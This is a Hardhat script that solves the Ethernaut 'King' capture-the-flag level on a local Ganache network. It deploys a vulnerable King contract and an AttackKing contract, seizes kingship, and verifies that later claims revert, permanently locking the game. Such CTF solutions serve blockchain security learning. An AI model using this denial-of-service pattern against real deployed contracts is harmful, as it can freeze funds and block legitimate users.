/*
The King contract represents a very simple game: 
  - Whoever sends it an amount of ether that is larger than the current prize becomes the new king. 
  - On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! 
    - As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.
*/

const hre = require("hardhat");
const path = require("path");
require('dotenv').config( {
  path: path.join(__dirname, '.env')
} );

PRIVATE_KEY=process.env.PRIVATE_KEY;
GAS_LIMIT=process.env.GAS_LIMIT;

async function main() {
  // Recreating the attack on ganache
  [macias, deployer] = await ethers.getSigners();

  const King = await hre.ethers.getContractFactory("King");
  this.king = await King.connect(deployer).deploy({ value: hre.ethers.utils.parseEther("0.001") });
  await this.king.deployed();

  const AttackKing = await hre.ethers.getContractFactory("AttackKing");
  this.attackKing = await AttackKing.connect(macias).deploy(this.king.address);
  await this.attackKing.deployed();

  console.log(
    `
    King before the attack ${await this.king._king()} \n
    Prize before the attack ${await this.king.prize()} \n
    `
  );

  console.log("\n\n Performing attack ... \n\n");

  const currentPrize = await this.king.prize(); // The returned value is already expressed in wei
  const claimTheThroneMinAmmount = hre.ethers.utils.parseEther("0.001");
  const attackPrize = currentPrize.add(claimTheThroneMinAmmount)

  console.log("Current Prize: ", hre.ethers.utils.formatEther(currentPrize));
  console.log("Attack Prize: ", hre.ethers.utils.formatEther(attackPrize));

  // Claiming the Throne
  console.log("Claiming the Throne ...");
  const tx = await this.attackKing.connect(macias).attackKingGame({ value: attackPrize });
  
  // Await for the tx to be mined
  console.log("Waiting while the King contract is been rekt : )");
  let txResult = await tx.wait();

  console.log("transaction " , txResult);

  console.log("===============================================\n===============================================\n");
  console.log("\n\n Results after performing the attack \n\n");

  console.log(
    `
    AttackKing contract address: ${this.attackKing.address} \n
    New King after the attack ${await this.king._king()} \n
    Prize after the attack ${await this.king.prize()} \n
    `
  );


  console.log("===============================================\n===============================================\n");
  console.log("\n\n Validating that the attack indeed blocks the King game and no one else can claim the throne \n\n");

  console.log("The contendant king tries to claim the Throne\n");
  const contendantPrize = hre.ethers.utils.parseEther("1");
  
  // Signing and Sending the tx
  const wallet = new hre.ethers.Wallet(PRIVATE_KEY);

  gasPrice = await hre.ethers.provider.getGasPrice()
  nonce = await hre.ethers.provider.getTransactionCount(wallet.address);

  let condentantTx = {
    nonce: nonce,
    to: this.king.address,
    value: contendantPrize,
    gasLimit: parseInt(GAS_LIMIT),
    gasPrice: gasPrice
  };

  
  let signedContendantTx = await wallet.signTransaction(condentantTx);
  
  try {
    const sentContendantTx = await hre.ethers.provider.sendTransaction(signedContendantTx);
    console.log("sentContendantTx: ", sentContendantTx);
    
    let contendantTxResult = await hre.ethers.provider.waitForTransaction(sentContendantTx.hash);
    console.log("contendantTxResult Result: ", contendantTxResult);
    } catch (error) {
    // If the transaction is reverted (even though is because of an error caused by the contract's code ), a weird error like the following will be thrown in the console:
                  /* ProviderError: HttpProviderError
                    at HttpProvider.request
                  */
    // IMHO, the above error is totally missleading of what caused the real issue
    console.log("This transaction is expected to fail because the King contract will revert all attempts to claim the Throne");
    console.log("ERROR: \n" , error);
  }

  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});